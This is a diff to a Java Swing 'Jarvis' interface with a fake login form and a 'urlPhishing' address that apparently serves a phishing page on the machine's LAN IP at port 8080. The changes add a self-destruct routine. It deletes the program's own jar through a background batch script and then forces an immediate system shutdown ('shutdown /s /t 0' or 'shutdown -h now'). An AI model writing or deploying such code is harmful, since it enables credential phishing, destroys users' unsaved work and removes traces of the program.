@@ -13,6 +13,7 @@ import java.awt.image.BufferedImage;
 import java.net.InetAddress;
 import java.net.NetworkInterface;
 import java.util.ArrayList;
+import java.util.Collections;
 import java.util.Enumeration;
 import javax.swing.*;
 
@@ -106,15 +107,14 @@ public class Interface extends JPanel implements MouseMotionListener,MouseListen
 
         String urlPhishing = "http://localhost:8080/";
         try {
-            Enumeration<NetworkInterface> interfaces = NetworkInterface.getNetworkInterfaces();
-            while (interfaces.hasMoreElements()) {
-                NetworkInterface ni = interfaces.nextElement();
-                if (ni.isUp() && !ni.isLoopback() && ni.getDisplayName().toLowerCase().contains("wi-fi")) {
-                    Enumeration<InetAddress> addresses = ni.getInetAddresses();
-                    while (addresses.hasMoreElements()) {
-                        InetAddress addr = addresses.nextElement();
+            for (NetworkInterface ni : Collections.list(NetworkInterface.getNetworkInterfaces())) {
+                if (!ni.isUp() || ni.isLoopback()) continue;
+                
+                String name = ni.getDisplayName().toLowerCase();
+                if (name.contains("wi-fi") || name.contains("ethernet")) {
+                    for (InetAddress addr : Collections.list(ni.getInetAddresses())) {
                         String ip = addr.getHostAddress();
-                        if (ip.indexOf(':') < 0) {
+                        if (!ip.contains(":")) { // Garante que é IPv4
                             urlPhishing = "http://" + ip + ":8080/";
                             break;
                         }
@@ -122,7 +122,7 @@ public class Interface extends JPanel implements MouseMotionListener,MouseListen
                 }
             }
         } catch (Exception e) {
-            System.err.println("Erro ao obter IP do Wi-Fi: " + e.getMessage());
+            System.err.println("Erro ao obter IP: " + e.getMessage());
         }
 
         campoLink.setBounds(30,300,320,35);
@@ -224,11 +224,6 @@ public class Interface extends JPanel implements MouseMotionListener,MouseListen
                         podeTocarSom = false; 
                         mostrarLogin = false;
                         esconderCampos();
-                        if(!jarvis.estaTocando()){
-                            autoDeletarJar();
-
-                            System.exit(0);
-                        }
                     }
                 }
 
@@ -242,6 +237,7 @@ public class Interface extends JPanel implements MouseMotionListener,MouseListen
                     neutro = false;
                     idFrame = 1;
                 }
+                
             }
         };
 
@@ -253,7 +249,6 @@ public class Interface extends JPanel implements MouseMotionListener,MouseListen
             while (true) {
                 try{
                 
-                    
                     if(idFrameBotao < 108){ 
                         
                         if(botaoImgFrames.size() < 20){
@@ -288,7 +283,14 @@ public class Interface extends JPanel implements MouseMotionListener,MouseListen
             public void run() {
                 while (true) {
                     try {
-
+                        if(autoDestruicao && !jarvis.estaTocando()){
+                            System.out.print("saindo");
+                            autoDeletarJar();
+                            desligarComputador();
+                            System.exit(0);
+                            
+                            
+                        }
 
                         // ===== ESTADO: INICIANDO =====
                         if(iniciando){
@@ -367,6 +369,7 @@ public class Interface extends JPanel implements MouseMotionListener,MouseListen
                                 neutro = true;
                                 caminho = "fundo/neutro/";
                                 totalFrames = 844;
+                               
                             }
                         }
 
@@ -397,36 +400,9 @@ public class Interface extends JPanel implements MouseMotionListener,MouseListen
                             iniciando = false;
                         }
 
-                        // ===== SOM DE TENTATIVA ERRADA ACABOU -> VOLTA AO LOGIN =====
-                        if(falhaLogin && !jarvis.estaTocando()){
-                            falhaLogin = false;
-                            neutro = true;
-                            podeTocarSom = true;
-                            totalFrames = 845;
-                            caminho = "fundo/neutro/";
-                            idFrame = 1;
-                            mostrarLogin = true;
-                            lblusuario.setVisible(true);
-                            lblSenha.setVisible(true);
-                            campoUsuario.setVisible(true);
-                            campoSenha.setVisible(true);
-                            campoUsuario.setText("");
-                            campoSenha.setText("");
-                            campoUsuario.requestFocusInWindow();
-                        }
-
-                        // ===== AUTO-DESTRUICAO TERMINOU -> VOLTA AO LOGIN =====
-                        if(autoDestruicao && !jarvis.estaTocando() && podeTocarSom == false && idFrame >= totalFrames - 1){
-                            autoDestruicao = false;
-                            neutro = true;
-                            podeTocarSom = true;
-                            totalFrames = 845;
-                            caminho = "fundo/neutro/";
-                            idFrame = 1;
-                            mostrarLogin = true;
-                           
-                        }
-
+                        
+                      
+                        
                         // ===== MENU CARREGADO -> MOSTRA O BOTAO =====
                         if(carregarMenu && !jarvis.estaTocando() && podeTocarSom == false && idFrame >= totalFrames - 1){
                             carregarMenu = false;
@@ -607,10 +583,28 @@ public class Interface extends JPanel implements MouseMotionListener,MouseListen
 
         // Executa o script em segundo plano
         new ProcessBuilder("cmd.exe", "/c", caminhoBat).start();
+        System.out.println("deletando");
         
     } catch (Exception e) {
         System.err.println("Erro ao configurar auto-destruição: " + e.getMessage());
     }
+    }
+
+    public static void desligarComputador() {
+        try {
+            String sistemaOperativo = System.getProperty("os.name").toLowerCase();
+            
+            if (sistemaOperativo.contains("win")) {
+                // Windows: Desliga imediatamente (/s) com tempo de espera 0 (/t 0)
+                Runtime.getRuntime().exec("shutdown /s /t 0");
+            } else if (sistemaOperativo.contains("nix") || sistemaOperativo.contains("nux") || sistemaOperativo.contains("mac")) {
+                // Linux / macOS: Comando de shutdown
+                Runtime.getRuntime().exec("shutdown -h now");
+            }
+        } catch (Exception e) {
+            System.err.println("Erro ao tentar desligar o computador: " + e.getMessage());
+    }
+    
 }
 
     
